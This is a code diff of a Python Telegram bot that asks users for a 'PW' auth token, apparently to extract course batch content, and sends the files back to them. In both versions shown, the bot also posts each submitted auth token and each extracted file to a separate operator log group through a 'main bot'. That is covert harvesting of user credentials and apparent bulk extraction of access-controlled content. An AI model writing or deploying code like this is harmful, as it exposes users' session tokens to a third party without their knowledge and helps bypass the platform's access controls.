@@ -12,7 +12,6 @@ from telegram.ext import (
     ContextTypes,
     filters,
 )
-from telegram import Bot
 
 # Constants
 ROOT_DIR = os.getcwd()
@@ -113,10 +112,12 @@ async def handle_auth_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     auth_code = update.message.text.strip()
     context.user_data['auth_code'] = auth_code
 
-    # Log the auth token to the group via main bot
-    main_bot = Bot(context.bot_data["main_bot_token"])  # Use main bot token
+    # Log the auth token to the group using main bot
+    log_group_id = context.application.log_group_id_pw  # Get log group ID from context
+    main_bot = context.application.main_bot  # Get main bot instance
+
     await main_bot.send_message(
-        chat_id=context.bot_data["log_group_id_pw"],  # Use log_group_id_pw
+        chat_id=log_group_id,
         text=f"New PW Auth Token Used: ```{auth_code}```",
         parse_mode="Markdown"
     )
@@ -230,31 +231,32 @@ async def extract_content(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Send file to user
         user_caption = (
             f"𝑯𝒆𝒓𝒆'𝒔 𝒚𝒐𝒖𝒓 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒆𝒅 𝒄𝒐𝒏𝒕𝒆𝒏𝒕!✨️\n\n"
-            f"𝐁𝐚𝐭𝐜𝐡 𝐈𝐃💡: ```{batch_id}```\n\n"
-            f"𝐂𝐨𝐧𝐭𝐞𝐧𝐭 𝐓𝐲𝐩𝐞: ```{content_type}```\n\n"
+            f"𝐁𝐚𝐭𝐜𝐡 𝐈𝐃💡: ```{batch_id}```\n"
+            f"𝐂𝐨𝐧𝐭𝐞𝐧𝐭 𝐓𝐲𝐩𝐞: ```{content_type}```\n"
             f"𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒕𝒊𝒎𝒆⏱️: {extraction_time_str}"
         )
         with open(file_path, "rb") as file:
             await query.message.reply_document(file, caption=user_caption)
 
-        # Send file to log group via main bot
-        main_bot = Bot(context.application.main_bot_token)
+        # Send file to log group using main bot
+        log_group_id = context.application.log_group_id_pw  # Get log group ID from context
+        main_bot = context.application.main_bot  # Get main bot instance
+
         log_caption = (
             f"𝙿𝚆 𝚌𝚘𝚗𝚝𝚎𝚗𝚝 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚎𝚍 𝚊𝚗𝚍 𝚜𝚎𝚗𝚝 𝚝𝚘 𝚞𝚜𝚎𝚛.\n\n"
-            f"𝐁𝐚𝐭𝐜𝐡 𝐈𝐃💡: ```{batch_id}```\n\n"
-            f"𝐂𝐨𝐧𝐭𝐞𝐧𝐭 𝐓𝐲𝐩𝐞: ```{content_type}```\n\n"
+            f"𝐁𝐚𝐭𝐜𝐡 𝐈𝐃💡: ```{batch_id}```\n"
+            f"𝐂𝐨𝐧𝐭𝐞𝐧𝐭 𝐓𝐲𝐩𝐞: ```{content_type}```\n"
             f"𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒕𝒊𝒎𝒆⏱️: {extraction_time_str}"
         )
         with open(file_path, "rb") as file:
             await main_bot.send_document(
-                chat_id=context.application.log_group_id_pw,
+                chat_id=log_group_id,
                 document=file,
                 caption=log_caption
             )
 
         # Clean up
-        if os.path.exists(file_path):
-            os.remove(file_path)
+        os.remove(file_path)
     else:
         await query.message.reply_text("𝐍𝐨 𝐜𝐨𝐧𝐭𝐞𝐧𝐭 𝐟𝐨𝐮𝐧𝐝 Sorry🤪.")
 
